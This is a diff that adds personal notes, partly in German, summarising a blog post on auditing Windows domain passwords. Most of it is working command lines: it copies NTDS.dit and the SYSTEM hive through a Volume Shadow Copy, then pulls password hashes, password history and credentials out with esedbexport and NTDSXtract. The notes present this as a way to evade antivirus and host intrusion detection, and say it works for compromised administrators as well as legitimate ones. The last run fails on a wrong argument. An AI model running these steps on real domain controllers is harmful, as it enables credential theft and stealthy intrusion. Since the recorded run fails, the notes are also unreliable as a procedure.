@@ -1,0 +1,102 @@
+######################
+#Win 2012 PW Dumping
+#######################
+Summary von http://penturalabs.wordpress.com/2013/05/30/domain-password-audits/
+
+#Challenges
+- Anti-Virus technology continuing to block auditing/hacking tools like pwdump/fgdump, ability to audit passwords on a domain is starting to increase in difficultly.
+- In a series of recent audits it has been challenging to extract the domain hashes, and upon using familiar common tools like pwdump the Windows Security Accounts Manager (SAM); 
+surprisingly only reveals two accounts, where we would expect a long list of domain hashes.
+- Since Microsoft Windows 2000, Active Directory has stored credential information within a database engine called Extensible Storage Engine (ESE) based of the Jet database and used by Exchange v5.5 and WINS.
+- The default location for this file is %SystemRoot%\ntds\NTDS.DIT; as this file is in use by the domain controller, it is locked and cannot be accessed.
+- The problem at hand, is how to safely extract Domain password hashes without triggering Anti-Virus or even some HIDS/HIPS Vendors.  
+- This post will cover NTDS password cracking and Volume Shadow Copying in order to capture the hashes.
+
+
+#VSS to safely get a dump
+- Why use VSS… Well first you need administrator privileges to perform the password audit, so you should have the privileges to perform the necessary actions.
+- VSS is build into Windows from 2003; as its a legitimate set of commands it does not trigger AntiVirus (with built-in HID/HIPS). 
+-Therefore, as an administrator (legitimate or compromised) your typically free to run the following commands, and exfiltrate the password hash database.
+
+
+#Creating the Shadowcopy of the drive CONTAINING the ntds.dit file (generally C: drive but could be somewhere else if the file is big):
+vssadmin create shadow /for=c:
+
+#List
+vssadmin list shadows
+
+#Copy the NTDS.dit and SYSTEM files out of the Volume(s):
+copy \\?\GLOBALROOT\{device_id}\{device_name}\path_to\ntdis.dit [your destination]
+copy \\?\GLOBALROOT\{device_id}\{device_name}\path_to\SYSTEM [your destination]
+
+
+#ACHUTNG Copy hat nicht funktioniert unter Win 2012 (pfad probleme?)...noob braucht Shadow Copy Client...
+Next you will need to install the Shadow Copy Client. Some Windows Server OS's have the client install package in the following path:
+If you do not have that package you can download it from Microsoft, here is a link:http://technet.microsoft.com/en-us/windowsserver/bb405951.aspx
+
+
+
+#Delete vss snapshot
+vssadmin delete shadows
+
+
+
+#Extract ntdis.dit
+#First download the libesedb libraries from:
+http://pkgs.fedoraproject.org/repo/pkgs/libesedb/libesedb-alpha-20120102.tar.gz/198a30c98ca1b3cb46d10a12bef8deaf/libesedb-alpha-20120102.tar.gz
+Extract and compile the libesedb libraries:
+./configure
+make
+make install
+ldconfig
+
+
+#Second download the NTDSXtract framework
+http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+
+
+#After installing the libesedb libraries, extract the database tables from ntds.dit:
+homebox# esedbexport -l /tmp/ese.log -t /tmp/ntds.dit /home/rocky/pwextractwin/ntds.dit 
+esedbexport 20120102
+Opening file.
+Exporting table 1 (MSysObjects) out of 13.
+Exporting table 2 (MSysObjectsShadow) out of 13.
+Exporting table 3 (MSysObjids) out of 13.
+Exporting table 4 (MSysLocales) out of 13.
+Exporting table 5 (datatable) out of 13.
+Exporting table 6 (hiddentable) out of 13.
+Exporting table 7 (link_table) out of 13.
+Exporting table 8 (sdpropcounttable) out of 13. 
+Exporting table 9 (sdproptable) out of 13.
+Exporting table 10 (sd_table) out of 13.
+Exporting table 11 (MSysDefrag2) out of 13.
+Exporting table 12 (quota_table) out of 13.
+Exporting table 13 (quota_rebuild_progress_table) out of 13.
+
+
+#Extract the hashes/user info/password history
+homebox# python dsusers.py /tmp/ntds.dit.export/datatable.4 /tmp/ntds.dit.export/link_table.6 --passwordhashes --passwordhistory --certificates --supplcreds --membership > /tmp/ntds.dit.output
+Initialising engine...
+Scanning database - 100% -> 3570 records processed
+Searching for Schema object - 100% -> 1711 records processed
+Extracting schema information - 100% -> 1683 records processed
+Extracting object links...
+Traceback (most recent call last):
+  File "dsusers.py", line 126, in <module>
+    dsInitEncryption(syshive)
+  File "/home/rocky/pwextractwin/NTDSXtract 1.0/ntds/dsdatabase.py", line 303, in dsInitEncryption
+    bootkey = get_syskey(syshive_fname)
+  File "/home/rocky/pwextractwin/NTDSXtract 1.0/ntds/dsencryption.py", line 39, in get_syskey
+    sysaddr = HiveFileAddressSpace(syshive_fname)
+  File "/home/rocky/pwextractwin/NTDSXtract 1.0/framework/addrspace.py", line 76, in __init__
+    self.base = FileAddressSpace(fname)
+  File "/home/rocky/pwextractwin/NTDSXtract 1.0/framework/addrspace.py", line 39, in __init__
+    self.fhandle = open(fname, mode)
+IOError: [Errno 2] No such file or directory: '--membership'
+
+
+
+
+FAIL funktionierte nicht unter Win2012
+
+
